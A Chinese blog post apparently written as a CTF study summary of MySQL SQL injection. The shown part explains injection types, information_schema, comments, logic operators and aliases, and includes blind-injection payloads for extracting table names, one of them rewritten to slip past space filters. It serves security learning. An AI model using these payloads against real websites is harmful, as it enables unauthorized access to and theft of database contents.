class="nav-text">3.5.2.3. handler(mysql专属)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">3.6. 宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A4%E8%AF%86addslashes%E5%87%BD%E6%95%B0"><span class="nav-text">3.6.1. 认识addslashes函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-text">3.6.2. 原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A8%E6%B5%8B%E5%90%8E%E7%AB%AF%E8%AF%AD%E5%8F%A5"><span class="nav-text">3.7. 推测后端语句</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E9%98%B6"><span class="nav-text">3.7.1. || 进阶</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#update-inset-into%E6%B3%A8%E5%85%A5"><span class="nav-text">3.8. update, inset into注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%9A%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="nav-text">3.9. 多参数注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8mysql%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-text">3.10. 利用MySQL写入文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#select-..-into-outfileinto-dumpfile"><span class="nav-text">3.10.1. select .. into outfile&#x2F;into dumpfile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#secure_file_priv"><span class="nav-text">3.10.2. secure_file_priv</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5"><span class="nav-text">3.10.3. 利用日志写入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8mysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-text">3.11. 利用MySQL读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#load_file"><span class="nav-text">3.11.1. load_file()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rogue-mysql-server"><span class="nav-text">3.11.2. Rogue-MySQL-Server</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass"><span class="nav-text">4. Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-text">4.1. 过滤空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-text">4.2. 过滤关键字⭐</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-text">4.2.1. 大小写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-text">4.2.2. 双写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">4.2.3. 编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-if"><span class="nav-text">4.2.4. 过滤 if</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E4%BB%A3%E6%9B%BF%E7%BB%95%E8%BF%87"><span class="nav-text">4.2.5. 特殊字符代替绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-select"><span class="nav-text">4.2.6. 过滤 select</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-text">4.2.7. 过滤了字符串截取函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-sleep"><span class="nav-text">4.2.8. 过滤 sleep</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="nav-text">4.3. 过滤单引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-text">4.4. 过滤注释符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6"><span class="nav-text">4.5. 过滤比较符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-text">4.5.1. 过滤 &#x3D;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#like-%E7%BB%95%E8%BF%87"><span class="nav-text">4.5.1.1. like 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#in-%E7%BB%95%E8%BF%87"><span class="nav-text">4.5.1.2. in 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#regexp-%E7%BB%95%E8%BF%87"><span class="nav-text">4.5.1.3. regexp 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">4.5.1.4. &lt;&gt; 绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="nav-text">4.5.2. 过滤 &gt;, &lt;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#greatest-least%E7%BB%95%E8%BF%87"><span class="nav-text">4.5.2.1. greatest(), least()绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strcmp%E7%BB%95%E8%BF%87"><span class="nav-text">4.5.2.2. strcmp()绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#between-and-%E7%BB%95%E8%BF%87"><span class="nav-text">4.5.2.3. between and 绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="nav-text">4.6. 过滤逗号</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-text">5. 遇到的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E6%9F%A5%E8%AF%A2%E6%8A%80%E5%B7%A7%E7%BB%95%E8%BF%87%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-text">5.1. MySQL查询技巧绕过强类型比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83%E7%89%B9%E6%80%A7"><span class="nav-text">5.2. MySQL中字符串和数字比较特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-3"><span class="nav-text">5.2.1. 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="nav-text">5.2.2. 判断字段是否存在</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%97%E5%88%B0%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="nav-text">5.2.3. 得到字段内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87for%E8%BF%87%E6%BB%A4"><span class="nav-text">5.2.4. 绕过for过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#information_schema%E7%BB%95%E8%BF%87%E5%8F%8A%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-text">5.3. information_schema绕过及无列名注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#information_schema%E7%BB%95%E8%BF%87"><span class="nav-text">5.3.1. information_schema绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E6%8F%8F%E8%BF%B0"><span class="nav-text">5.3.1.1. 问题描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95"><span class="nav-text">5.3.1.2. 解决办法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql-5.7%E7%9A%84%E6%96%B0%E7%89%B9%E6%80%A7"><span class="nav-text">5.3.1.2.1. mysql 5.7的新特性</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#sys.schema_auto_increment_columns"><span class="nav-text">5.3.1.2.1.1. sys.schema_auto_Increment_columns</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#schema_table_statistics_with_buffer-xschema_table_statistics_with_buffer%E7%AD%89"><span class="nav-text">5.3.1.2.1.2. schema_table_statistics_with_buffer ,x$schema_table_statistics_with_buffer等</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">5.3.1.2.1.3. 绕过方法</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8Einnodb%E6%90%BA%E5%B8%A6%E7%9A%84%E8%A1%A8"><span class="nav-text">5.3.1.2.2. mysql默认存储引擎innoDB携带的表</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-text">5.3.2. 无列名注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-text">5.3.3. 题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag%E4%B8%8D%E5%9C%A8%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">flag不在当前数据库</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hdfzzf"
      src="/images/zzf.jpg">
  <p class="site-author-name" itemprop="name">hdfzzf</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">74</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">115</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/04/28/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zzf.jpg">
      <meta itemprop="name" content="hdfzzf">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="HDFZZF's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SQL注入总结
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-04-28 00:00 / 修改时间：13:12" itemprop="dateCreated datePublished" datetime="2022-04-28T00:00:00+08:00">2022-04-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2022/04/28/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/04/28/SQL注入总结/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>44k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>40 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>个人对于SQL注入的知识点的总结。</p>
<span id="more"></span>
<h1 id="sql注入基础知识">1. SQL注入基础知识</h1>
<p>所有的演示和知识点都是以MySQL为例，其他数据库类似。</p>
<h2 id="什么是sql注入">1.1. 什么是SQL注入？</h2>
<p>SQL(Structured Query Language)是一门 ANSI 的标准计算机语言，用来访问和操作数据库系统。SQL语句用于取回和更新数据库中的数据。</p>
<p>SQL注入指将<strong>恶意的SQL命令</strong>插入到开发者设置的SQL语句中，违背了SQL语句原本的意图，达到执行恶意SQL命令的目的。<strong>SQL注入一般发生在开发者没有对用户的输入数据进行严格的限制/转义</strong>，致使用户在输入一些特定的字符时，在与后端设定的SQL语句拼接时产生了歧义，使得用户可以控制该条SQL语句与数据库进行通信。</p>
<h2 id="常规sql注入分类">1.2. 常规SQL注入分类</h2>
<ol type="1">
<li>按照变量类型分类：
<ol type="1">
<li>数字型</li>
<li>字符型</li>
</ol></li>
<li>按SQL语句提交方式分类：
<ol type="1">
<li>GET注入</li>
<li>POST注入</li>
<li>HTTP头部注入</li>
<li>Cookie/Session注入</li>
</ol></li>
<li>按注入方式分类：
<ol type="1">
<li>有回显：
<ol type="1">
<li>联合查询注入</li>
<li>堆叠注入</li>
</ol></li>
<li>无回显：
<ol type="1">
<li>报错注入</li>
<li>时间盲注</li>
<li>布尔盲注</li>
</ol></li>
</ol></li>
</ol>
<h2 id="sql常见语句格式">1.3. SQL常见语句格式</h2>
<p>SQL语句常用的有四大类，一般为增、删、改、查。<strong>其中最常见的就是查了</strong>。</p>
<ol type="1">
<li>增：<code>insert into &lt;tableName&gt;(&lt;columnName1&gt;,&lt;columnName2&gt;,...) values(&lt;value1&gt;,&lt;value2&gt;...);</code></li>
<li>删：<code>delete from &lt;tableName&gt; where &lt;codition&gt;;</code></li>
<li>改：<code>update &lt;tableName&gt; set &lt;columnName&gt;=&lt;value&gt;[,&lt;columnName&gt;=&lt;value&gt;,...] where &lt;codition&gt;;</code></li>
<li>查：<code>select &lt;columnName&gt;[,&lt;columnName&gt;,...] from &lt;tableName&gt; where &lt;codition&gt;</code></li>
</ol>
<h2 id="数据库必备知识点">1.4. 数据库必备知识点</h2>
<p>如果<strong>MySQL的版本&gt;=5.0</strong>，MySQL中就会存在一个自带的数据库名称为<strong>information_schema</strong>，这是一个记录了<strong>所有数据库名，表名，列名</strong>的数据库。因此，可以利用该数据库获得特定数据库下面的表名和列名信息。其中：</p>
<ul>
<li>information_schema.schemata: 记录了所有数据库名信息的表（一般用不到）</li>
<li>information_schema.tables: 记录了所有表名信息的表</li>
<li>information_schema.columns: 记录了所有列名信息的表</li>
</ul>
<p>如果<strong>MySQL的版本&lt;5.0</strong>，那么MySQL中就不存在这么一个数据库，这种情况下只能猜测特定数据库下的表名和列名等信息。</p>
<p>数据库中符号<code>.</code>表示的是下一级，如<code>information_schema.tables</code>表示的就是information_schema数据库下的名为tables的表。</p>
<p>以及一些会用到的函数及变量：</p>
<ul>
<li>table_schema, table_name, column_name: 分别是数据库名、表名、列名。举一个例子：<code>select group_concat(column_name) from information_schema.columns where table_schema='databaseName' and table_name='tableName';</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423191054.png" /></p>
<ul>
<li>user() &lt;=&gt; @<span class="citation" data-cites="user">@user</span>: 查看当前MySQL登录的用户名</li>
<li>database(): 查看当前使用的MySQL数据库的名字</li>
<li>version(): 查看当前MySQL版本</li>
<li>@<span class="citation" data-cites="version_compile_os">@version_compile_os</span>: 查看系统</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423191151.png" /></p>
<blockquote>
<p>还有一些知识点会在遇到的时候补充在对应章节。</p>
</blockquote>
<h3 id="注释方式">1.4.1. 注释方式</h3>
<h4 id="常规注释">1.4.1.1. 常规注释</h4>
<p>常见的有三种注释方式： 1. <code>--</code>注意后面有空格；（一般通过url传如的时候都是<code>--+</code>，+会被当作空格，也可以写%20，这时空格的url编码） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195759.png" /></p>
<ol start="2" type="1">
<li><p><code>#</code>；</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195819.png" /></p></li>
<li><p><code>/*[内容]*/</code>；</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195842.png" /></p></li>
</ol>
<p>其中前两种为单行注释，第三种只将中间的内容当作注释。在图片中前两种因为把后面的内容全部注释了，包括<code>;</code>，因此需要再次输入<code>;</code>才可以。而后者并没有注释分号。为了做对比，没有注释的情况如下，可以看到只有一行结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423200014.png" /></p>
<h4 id="内联注释">1.4.1.2. 内联注释</h4>
<p>MySql中为了保持兼容，比如用 mysqldump 导出的SQL语句能被其它数据库直接使用，它把一些特有的仅在MySQL上的语句放在<code>/*!&#123;语句&#125;*/</code>中，这样这些语句如果在其它数据库中是不会被执行，但在MySQL中它会执行。因此，这并不算是严格意义上的注释</p>
<p>例子如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423200344.png" /></p>
<h2 id="逻辑运算">1.5. 逻辑运算</h2>
<p>常用的就是三类：与、或、异或和非。</p>
<p>与(and, &amp;&amp;)： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 and 1 = 1</span><br><span class="line">1 and 0 = 0</span><br><span class="line">0 and 1 = 0</span><br><span class="line">0 and 0 = 0</span><br></pre></td></tr></table></figure></p>
<p>或(or, ||)： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 or 1 = 1</span><br><span class="line">1 or 0 = 1</span><br><span class="line">0 or 1 = 1</span><br><span class="line">0 or 0 = 0</span><br></pre></td></tr></table></figure></p>
<p>异或(^)： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 = 0</span><br><span class="line">1 ^ 0 = 1</span><br><span class="line">0 ^ 1 = 1</span><br><span class="line">0 ^ 0 = 0</span><br></pre></td></tr></table></figure></p>
<p>非(~)： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~0 = 1</span><br><span class="line">~1 = 0</span><br></pre></td></tr></table></figure></p>
<p>mysql中and优先级大于or；&amp;优先级大于=</p>
<p>注意：逻辑运算前后的内容应该是各自为一体的，比如说<code>condition1 and condition2</code>，不能够出现<code>condition1 and condtition2.1 condition2.2</code>，对于后者的情况，可以使用两个办法：</p>
<ol type="1">
<li><code>condition1 and (condtition2.1 condition2.2)</code></li>
<li><code>condition1 and condtition2.1 and condition2.2</code></li>
</ol>
<p><strong>条件要么用括号括起来，要么就不要出现空格！！！</strong></p>
<p>需要注意，以与运算为例，如果运算式为<code>condition1 and condition2</code>，并且condition1为false，那么此时无论condition2是什么都无所谓了，因为此时结果已经定下来了，那就是0，所以condition2不会被执行。</p>
<h2 id="括号的问题">1.6. 括号的问题</h2>
<p>比如说length(str)，如果出现length(sql语句)，就需要把sql语句括起来，当作一个整体，因为length(str)只接收一个参数，所以正确写法为：lengt((sql语句))。</p>
<p>这在空格被过滤的时候很经常用到，比如常规的payload如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+</span><br></pre></td></tr></table></figure></p>
<p>如果括号被过滤了，那么可以用()代替括号，将上述payload修改为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;or(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=101)--+</span><br></pre></td></tr></table></figure></p>
<p>简单的理解：关键字是用来将一些条件语句、变量连接起来的，因此，可以当作如下样子： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(条件语句/变量)fromm(条件语句/变量)where(条件语句/变量)and(条件语句/变量)</span><br></pre></td></tr></table></figure></p>
<h2 id="取别名">1.7. 取别名</h2>
<h3 id="为字段取别名">1.7.1. 为字段取别名</h3>
<p>可以为查询的字段取别名，此时as可以不写。 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username <span class="keyword">as</span> b,password <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span>:</span><br><span class="line"><span class="keyword">select</span> id,(username)b,password <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205612.png" /></p>
<h3 id="为表取别名">1.7.2. 为表取别名</h3>
<p>多用于二次查询时，配合字段的别名一起使用（此时必须为表取别名，否则直接报错） <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users)<span class="keyword">as</span> alia; # 此时<span class="keyword">as</span>也可以不写，注意最前面的<span class="number">3</span>是被反引号包围</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205834.png" /></p>
<p>解释：首先执行<code>(select 1,2,3,4 from users)as alia</code>，得到列名分别为1，2，3，4的一张表，并且取了一个别名alia。然后执行 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">3</span>` <span class="keyword">from</span> alia; # 反引号是必须的，否则报错</span><br></pre></td></tr></table></figure></p>
<p>从alia中取出列名为3的信息。</p>
<p>也可以为列名再取别名： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span> <span class="keyword">from</span> users)<span class="keyword">as</span> alia;</span><br></pre></td></tr></table></figure></p>
<p>多用于反引号被过滤。</p>
<h2 id="一次执行多条sql语句">1.8. 一次执行多条sql语句</h2>
<p>常规的sql语句为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p>可以通过union select连接两个或多个查询语句： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> password <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424215405.png" /></p>
<p>可以直接输入多条sql语句，语句之间用;分隔，这样子数据库就会按着顺序一条一条执行： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> users; <span class="keyword">select</span> username <span class="keyword">from</span> users; <span class="keyword">select</span> password <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424215447.png" /></p>
<h2 id="预编译">1.9. 预编译</h2>
<p>有些时候，我们需要多次查询，但是每次查询有可能只是where后面的条件不一样，但是每次我们都需要输入完整的查询语句，非常浪费时间，因此才有了预编译。以查询为例： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>?;</span><br></pre></td></tr></table></figure></p>
<p>将id后面的值用占位符占注，并给这句话起一个别名，那么下次使用的时候只需要输入别名以及变量即可。</p>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 定义预处理语句</span><br><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line"></span><br><span class="line"># 执行预处理语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> <span class="variable">@var</span>_name [, <span class="variable">@var</span>_name] ...];</span><br><span class="line"></span><br><span class="line"># 删除(释放)定义</span><br><span class="line">&#123;<span class="keyword">DEALLOCATE</span> <span class="operator">|</span> <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name;</span><br></pre></td></tr></table></figure></p>
